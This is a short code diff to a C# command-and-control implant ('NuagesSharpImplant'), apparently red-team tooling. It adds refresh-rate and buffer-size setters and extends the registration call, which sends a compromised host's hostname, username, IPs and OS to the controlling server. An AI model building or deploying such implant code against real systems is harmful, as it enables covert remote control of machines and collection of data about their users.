@@ -33,7 +33,19 @@ namespace NuagesSharpImplant
         {
             return this.NC2Con.getRefreshRate();
         }
+        public void setRefreshRate(int refreshrate)
+        {
 
+            this.NC2Con.setRefreshRate(refreshrate);
+
+        }
+
+        public void setBufferSize(int buffersize)
+        {
+
+            this.NC2Con.setBufferSize(buffersize);
+
+        }
         string POST(string url, string jsonContent)
         {
             return this.NC2Con.POST(url, jsonContent);
@@ -51,9 +63,10 @@ namespace NuagesSharpImplant
             this.POST("jobresult", body.ToString());
         }
 
-        public string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
+        public string RegisterImplant(string type = "", string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> config = null, String[] supportedPayloads = null)
         {
             JObject body = new JObject(
+                new JProperty("implantType", type),
                 new JProperty("hostname", hostname),
                 new JProperty("username", username),
                 new JProperty("localIp", localIp),
@@ -61,7 +74,7 @@ namespace NuagesSharpImplant
                 new JProperty("os", os),
                 new JProperty("handler", handler),
                 new JProperty("connectionString", connectionString),
-                new JProperty("options", JObject.FromObject(options)),
+                new JProperty("config", JObject.FromObject(config)),
                 new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
             );
             JObject response = JObject.Parse(this.POST("register", body.ToString()));
